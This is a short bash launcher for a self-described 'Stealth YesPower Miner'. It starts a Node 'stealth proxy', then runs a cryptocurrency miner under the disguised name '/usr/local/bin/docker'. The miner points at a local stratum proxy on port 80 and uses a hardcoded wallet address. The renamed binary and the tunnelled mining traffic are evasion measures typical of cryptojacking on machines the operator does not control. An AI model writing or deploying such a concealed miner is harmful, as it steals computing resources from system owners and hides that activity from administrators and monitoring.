#!/bin/bash
set -e

echo "=== Stealth YesPower Miner Started ==="

# Jalankan stealth proxy
node /wsproxy.js &
sleep 3

echo "⛏️  Mining started with hardcoded config..."

exec /usr/local/bin/docker \
    -a yespower \
    -o stratum+tcp://127.0.0.1:80 \
    -u "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker" \
    -p "c=SWAMP,mc=SWAMP" \
    -t 2 \
    "$@"
